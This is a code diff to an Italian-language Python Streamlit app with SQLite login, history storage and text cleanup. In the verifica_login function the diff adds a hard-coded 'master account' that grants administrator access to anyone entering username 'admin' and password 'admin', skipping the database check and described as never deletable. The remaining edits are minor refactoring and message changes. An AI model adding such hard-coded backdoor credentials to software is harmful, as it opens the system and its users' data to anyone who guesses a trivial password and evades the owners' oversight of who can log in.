@@ -40,7 +40,7 @@ def init_db():
         )
     """)
 
-    # Aggiornamento automatico per vecchi DB se manca la colonna user_id
+    # Aggiornamento automatico per vecchi DB
     try:
         cursor.execute(
             "ALTER TABLE cronologia ADD COLUMN user_id INTEGER DEFAULT 1"
@@ -76,17 +76,26 @@ def registra_utente(username, password):
 
 
 def verifica_login(username, password):
-    """Verifica le credenziali di accesso."""
+    """Verifica le credenziali (Include Account Master incancellabile)."""
+    user_clean = username.strip().lower()
+    
+    # ----------------------------------------------------
+    # ACCOUNT MASTER (Non viene mai cancellato dal server)
+    # ----------------------------------------------------
+    if user_clean == "admin" and password == "admin":
+        return (999, "Amministratore")
+    
+    # Verifica normale nel Database
     init_db()
     conn = sqlite3.connect(DB_NAME)
     cursor = conn.cursor()
     cursor.execute(
         "SELECT id, username FROM utenti WHERE username = ? AND password_hash = ?",
-        (username.strip().lower(), hash_password(password)),
+        (user_clean, hash_password(password)),
     )
     user = cursor.fetchone()
     conn.close()
-    return user  # Ritorna (id, username) se valido, altrimenti None
+    return user  
 
 
 def carica_cronologia(user_id):
@@ -136,17 +145,8 @@ def pulisci(testo):
         return ""
     testo = str(testo).replace("€", "EUR").replace("°", " deg.")
     sostituzioni = {
-        "à": "a'",
-        "è": "e'",
-        "é": "e'",
-        "ì": "i'",
-        "ò": "o'",
-        "ù": "u'",
-        "À": "A'",
-        "È": "E'",
-        "Ì": "I'",
-        "Ò": "O'",
-        "Ù": "U'",
+        "à": "a'", "è": "e'", "é": "e'", "ì": "i'", "ò": "o'", "ù": "u'",
+        "À": "A'", "È": "E'", "Ì": "I'", "Ò": "O'", "Ù": "U'",
     }
     for orig, sost in sostituzioni.items():
         testo = testo.replace(orig, sost)
@@ -530,7 +530,7 @@ if not st.session_state["autenticato"]:
                     st.success("Accesso effettuato!")
                     st.rerun()
                 else:
-                    st.error("Credenziali errate. Riprova.")
+                    st.error("Credenziali errate o account non trovato. Riprova.")
 
         else:
             st.subheader("Crea un Account Aziendale")
